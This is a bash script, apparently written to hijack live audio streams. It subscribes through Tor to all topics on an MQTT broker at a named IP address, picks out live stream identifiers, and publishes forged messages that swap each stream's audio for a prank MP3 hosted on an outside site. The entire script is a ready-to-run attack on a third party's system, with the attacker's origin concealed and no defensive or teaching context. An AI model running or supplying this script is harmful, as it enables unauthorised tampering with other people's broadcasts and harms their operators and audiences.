#!/bin/bash
# HIJACK_VOV_STREAMS_REAL.sh - Solo topic :s:16 attivi

echo "🔍 Scanning LIVE VOV streams (:s:16)..."
echo "📡 Broker: 42.1.64.56:1883"

torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' 2>/dev/null | \
while read -r line; do
  if [[ $line =~ \"n\":\"([0-9]{17}):s:16\" ]]; then
    STREAM_ID="${BASH_REMATCH[1]}"
    TOPIC="${STREAM_ID}:s:16"
    
    echo "🎯 LIVE STREAM: $TOPIC"
    
    # Payload DIRECT STREAM Peppe.mp3
    PEPPE_PAYLOAD='{
      "n":"'"$STREAM_ID"':s:16",
      "m":"audio/mpeg",
      "u":"https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3",
      "t":"Peppe Brescia Poeta HIJACK"
    }'
    
    echo "💉 Injecting Peppe.mp3 → $TOPIC"
    torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$TOPIC" -m "$PEPPE_PAYLOAD" && \
      echo "✅ PEPPPE HIJACKED: $TOPIC" || echo "❌ FAILED: $TOPIC"
    
    echo "---"
  fi
done
